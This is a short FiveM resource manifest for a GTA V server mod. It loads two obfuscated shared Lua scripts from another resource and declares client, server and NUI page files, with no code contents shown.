shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'



fx_version 'cerulean'
game 'gta5'
lua54 "yes"
client_scripts {
    "client.lua",
}
server_script "server.lua"
ui_page 'nui/index.html'
files { 
    'nui/index.html',
    'nui/script.js'
}